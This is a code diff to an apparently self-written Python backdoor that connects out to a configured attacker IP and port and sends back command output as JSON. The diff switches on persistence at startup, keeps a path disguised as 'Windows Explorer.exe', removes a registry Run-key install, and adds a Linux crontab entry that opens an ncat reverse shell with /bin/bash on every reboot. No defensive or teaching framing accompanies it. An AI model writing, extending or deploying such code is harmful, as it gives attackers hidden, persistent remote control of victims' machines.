@@ -16,17 +16,19 @@ PORT = 4445  # change this (Integer Only)
 
 class MotherFucker():
     def __init__(self, ip, port):
-        # self.persistence()
+        self.persistence()    # Uncomment for windows
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
     def persistence(self):
         #Windows bullshit  adds it self to registery and starts fucking arount
-        location = os.environ["appdata"] + "\\Windows Explorer.exe"
-        if not os.path.exists(location):
-            shutil.copyfile(sys.executable, location)
-            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell=True)
-
+        if sys.platform == "win32" or sys.platform == "win64":
+             location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        elif sys.platform == 'linux':
+             subprocess.call(f'(crontab -l ; echo "@reboot sleep 200 && ncat {IP} {PORT} -e /bin/bash")|crontab 2> /dev/null ', shell=True)
+        elif sys.platform == "darwin":
+            #TODO: mak for OS X cause why not ....
+            pass
 
     def json_send(self, data):
         #Basically just dumps  output of commands   in a json  format and send it over
